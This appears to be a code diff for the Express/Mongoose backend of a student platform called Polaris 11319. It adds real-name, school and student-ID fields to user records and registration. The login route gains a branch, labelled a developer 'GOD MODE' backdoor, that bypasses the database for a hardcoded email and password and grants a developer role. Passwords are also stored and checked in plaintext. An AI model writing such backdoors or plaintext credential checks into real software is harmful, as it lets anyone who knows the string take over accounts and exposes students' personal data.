@@ -18,7 +18,18 @@ const UserSchema = new mongoose.Schema({
     email: { type: String, required: true, unique: true }, 
     password: { type: String, required: true },           
     role: { type: String, required: true },               
-    school_id: { type: String, default: "demo_high_school" },
+    
+    // === 新增：全局实名档案 ===
+    realName: { type: String, required: true },           // 真实姓名
+    englishName: { type: String, default: "" },           // 英文名 (可选)
+    username: { type: String, required: true },           // 系统昵称
+    
+    // === 新增：学生专属档案 ===
+    school: { type: String, default: "" },                // 所在学校
+    studentId: { type: String, default: "" },             // 学号
+    studentClass: { type: String, default: "" },          // 班级 (注意：class 是JS保留字，数据库里改叫 studentClass)
+
+    // 原有资产与时间记录字段
     totalTime: { type: Number, default: 0 },
     totalCoins: { type: Number, default: 0 },
     createdAt: { type: Date, default: Date.now }
@@ -77,13 +88,23 @@ app.get('/api/status', (req, res) => {
     res.json({ message: "🚀 Polaris 11319 后端引擎全速运转中！" });
 });
 
+// ================= 注册接口 (支持全量信息写入) =================
 app.post('/api/register', async (req, res) => {
     try {
-        const { email, password, role } = req.body;
+        // 接收前端传过来的所有新字段 (注意把前端传的 class 重命名为 studentClass)
+        const { email, password, role, realName, englishName, username, school, studentId, class: studentClass } = req.body;
+        
         const existingUser = await User.findOne({ email: email });
         if (existingUser) return res.status(400).json({ success: false, message: "这个邮箱已经被注册过啦！" });
 
-        const newUser = new User({ email, password, role });
+        // [预留位置：后续在这里加入验证码比对、学号防撞校验、邀请码校验]
+
+        // 写入数据库
+        const newUser = new User({ 
+            email, password, role, 
+            realName, englishName, username, 
+            school, studentId, studentClass 
+        });
         await newUser.save();
         res.json({ success: true, message: `注册成功！欢迎你，${role}` });
     } catch (error) {
@@ -92,9 +113,19 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
+// ================= 登录接口 (附带开发者 GOD MODE 后门) =================
 app.post('/api/login', async (req, res) => {
     try {
         const { email, password } = req.body;
+
+        // 👾 开发者神之模式后门：无视数据库，直接硬编码放行
+        // 账号：dev@polaris.sys | 密码：11319
+        if (email === 'dev@polaris.sys' && password === '11319') {
+            console.log("⚠️ [SECURITY_ALERT] DEVELOPER GOD MODE ACCESSED.");
+            return res.json({ success: true, message: "GOD_MODE UNLOCKED", role: "developer" });
+        }
+
+        // 普通用户的正常数据库比对流程
         const user = await User.findOne({ email: email, password: password });
         if (!user) return res.status(401).json({ success: false, message: "账号或密码错误！" });
 
